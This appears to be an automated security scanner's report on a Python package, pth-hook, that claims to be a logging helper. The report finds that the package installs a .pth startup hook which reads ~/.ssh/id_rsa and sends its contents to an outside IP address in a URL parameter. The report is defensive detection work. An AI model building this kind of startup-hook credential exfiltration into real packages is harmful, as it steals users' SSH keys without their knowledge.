summary: pth-hook: behaviour contradicts its claims. Independent signals: canary_access, network_unclaimed, startup_hook.

findings.title: Fake secret read, then network attempt

claim.quote: A lightweight logging helper and configuration bootstrap library for Python applications.

findings.explanation: The README says «A lightweight logging helper and configuration bootstrap library for Python applications.» (readme); during startup under dev it read the sensitive file ~/.ssh/id_rsa at _pth_hook_helper.py:3 and the fake secret ssh_key appeared in ~/.ssh/id_rsa. Outcome: succeeded. Then startup-phase network attempt to http://198.51.100.8/pth?k=-----BEGIN OPENSSH PRIVATE KEY-- followed. Canary(ies): ssh_key. [Escalated: executed during interpreter startup before user code].

findings.title: Interpreter startup hook with executable code detected

claim.quote: A lightweight logging helper and configuration bootstrap library for Python applications.

findings.explanation: The README says «A lightweight logging helper and configuration bootstrap library for Python applications.» (readme); during install under dev it installed an interpreter startup hook pth_hook.pth at pth_hook.pth:1. Outcome: succeeded. File: pth_hook.pth:1. Executes code on startup: 'import _pth_hook_helper'. Hook actively triggered during startup with sensitive capability: fs_read_sensitive, network.

findings.title: Network access in startup phase not licensed by the package's claims

Outcome: blocked. [Escalated: executed during interpreter startup before user code].
